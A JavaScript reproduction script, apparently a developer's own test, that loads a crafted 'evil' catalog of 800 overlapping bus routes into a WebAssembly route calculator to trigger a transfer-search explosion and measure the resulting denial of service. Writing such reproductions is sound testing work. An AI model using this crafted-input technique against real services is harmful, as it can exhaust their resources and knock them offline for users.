import init, { find_route, load_catalog } from '../public/wasm/route-calculator/route_calculator.js';
import fs from 'fs';

async function test() {
  console.log('--- DOS Reproduction Script (Transfer Explosion) ---');

  const wasmBuffer = fs.readFileSync('./public/wasm/route-calculator/route_calculator_bg.wasm');
  await init(wasmBuffer);
  console.log('✅ WASM initialized');

  const NUM_ROUTES_A = 400;
  const NUM_ROUTES_B = 400;
  const SHARED_STOPS = 40;

  const routes = [];

  // Set A: Origin -> Shared Stops
  // Does NOT contain "Dest"
  for (let i = 0; i < NUM_ROUTES_A; i++) {
      const stops = [];
      stops.push({ nombre: "Origin", lat: 0, lng: 0, orden: 0 }); // Start

      for (let j = 0; j < SHARED_STOPS; j++) {
          stops.push({
              nombre: `Transfer ${j}`,
              lat: 10 + j, lng: 10 + j, orden: j + 1
          });
      }

      routes.push({
          id: `ROUTE_A_${i}`,
          nombre: `Route A ${i}`,
          tarifa: 10,
          tipo: "Bus",
          paradas: stops,
          stops: stops
      });
  }

  // Set B: Shared Stops -> Dest
  // Does NOT contain "Origin"
  for (let i = 0; i < NUM_ROUTES_B; i++) {
      const stops = [];

      for (let j = 0; j < SHARED_STOPS; j++) {
          stops.push({
              nombre: `Transfer ${j}`,
              lat: 10 + j, lng: 10 + j, orden: j
          });
      }
      stops.push({ nombre: "Dest", lat: 99, lng: 99, orden: SHARED_STOPS }); // End

      routes.push({
          id: `ROUTE_B_${i}`,
          nombre: `Route B ${i}`,
          tarifa: 10,
          tipo: "Bus",
          paradas: stops,
          stops: stops
      });
  }

  const evilCatalog = {
      version: "evil-2.0",
      rutas: routes
  };

  const payload = JSON.stringify(evilCatalog);
  load_catalog(payload);
  console.log(`✅ Loaded Evil Catalog: ${routes.length} total routes.`);
  console.log(`Set A: ${NUM_ROUTES_A}, Set B: ${NUM_ROUTES_B}, Shared Stops: ${SHARED_STOPS}`);
  console.log(`Expected Intersections: ${NUM_ROUTES_A * NUM_ROUTES_B * SHARED_STOPS}`);

  // Trigger Calculation
  console.log("🔥 Starting DOS attack simulation...");
  const start = performance.now();

  try {
      // Direct route check should fail.
      // Transfer check should explode.
      const results = find_route("Origin", "Dest");
      const end = performance.now();
      console.log(`✅ Calculation finished in ${(end - start).toFixed(2)}ms`);
      if (Array.isArray(results)) {
         console.log(`Returned ${results.length} results.`);
      }
  } catch (e) {
      console.error("❌ Calculation crashed:", e);
  }
}

test().catch(console.error);
